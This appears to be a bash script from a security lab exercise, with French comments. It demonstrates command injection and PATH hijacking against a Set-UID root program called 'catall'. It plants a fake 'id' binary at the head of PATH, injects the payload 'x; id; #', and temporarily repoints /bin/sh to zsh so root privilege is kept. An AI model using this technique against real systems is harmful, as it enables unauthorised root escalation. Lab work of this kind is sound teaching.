#!/bin/bash
# T5 / E6b - Detournement par variable d'environnement (PATH)
#
# On injecte une commande par son nom NU ("id", pas "/usr/bin/id") dans
# l'argument de catall. Le shell lance par system() resout ce nom en
# consultant $PATH. Comme l'attaquant controle entierement son propre
# environnement avant de lancer catall (qui est Set-UID root), il peut
# placer un faux binaire "id" en tete de PATH : c'est ce faux binaire,
# et non /usr/bin/id, qui s'execute -- avec le privilege root de catall.
set -e

LAB_DIR="$(cd "$(dirname "$0")/../../Labsetup" && pwd)"
cd "$LAB_DIR"

MARKER=/tmp/pwned_t5.txt
EVIL_DIR=/tmp/evilbin
sudo rm -f "$MARKER"
rm -rf "$EVIL_DIR"
mkdir -p "$EVIL_DIR"

echo "=== Creation du faux binaire 'id' malveillant ==="
cat > "$EVIL_DIR/id" << 'EOF'
#!/bin/sh
echo "FAUX id EXECUTE - uid reel du processus:" > /tmp/pwned_t5.txt
/usr/bin/id >> /tmp/pwned_t5.txt
EOF
chmod +x "$EVIL_DIR/id"
cat "$EVIL_DIR/id"

echo
echo "=== PATH avant modification ==="
echo "$PATH"

echo
echo "=== PATH modifie pour cette invocation (repertoire malveillant en tete) ==="
export PATH="$EVIL_DIR:$PATH"
echo "$PATH"

echo
echo "=== Charge utile injectee (nom NU 'id', pas de chemin absolu) ==="
PAYLOAD="x; id; #"
echo "$PAYLOAD"

# On utilise zsh car il ne va pas enlever les privileges obtenus par un 
# program SetUID 
echo "=== Installation de zsh si absent ==="
if ! command -v zsh >/dev/null 2>&1; then
    sudo apt-get update -qq
    sudo apt-get install -y zsh
fi
 
echo
echo "=== Sauvegarde de la cible actuelle de /bin/sh ==="
ORIGINAL_SH_TARGET=$(readlink -f /bin/sh)
echo "/bin/sh pointe actuellement vers: $ORIGINAL_SH_TARGET"
 
echo
echo "=== Repointage temporaire de /bin/sh vers zsh ==="
sudo ln -sf /bin/zsh /bin/sh
ls -l /bin/sh
 
restore_sh() {
    echo
    echo "=== Restauration de /bin/sh -> $ORIGINAL_SH_TARGET ==="
    sudo ln -sf "$ORIGINAL_SH_TARGET" /bin/sh
    ls -l /bin/sh
}
trap restore_sh EXIT

echo
echo "=== Execution de catall avec ce PATH ==="
./catall "$PAYLOAD"

echo
echo "=== Contenu de $MARKER ==="
if [ -f "$MARKER" ]; then
    cat "$MARKER"
    echo
    echo "--> Le faux 'id' de $EVIL_DIR s'est execute a la place du vrai"
    echo "    /usr/bin/id, avec le privilege root de catall, uniquement"
    echo "    parce que le shell a resolu le nom via PATH -- une variable"
    echo "    entierement controlee par l'utilisateur invoquant."
    sudo rm -f "$MARKER"

else
    echo "ECHEC : le fichier marqueur n'a pas ete cree."
fi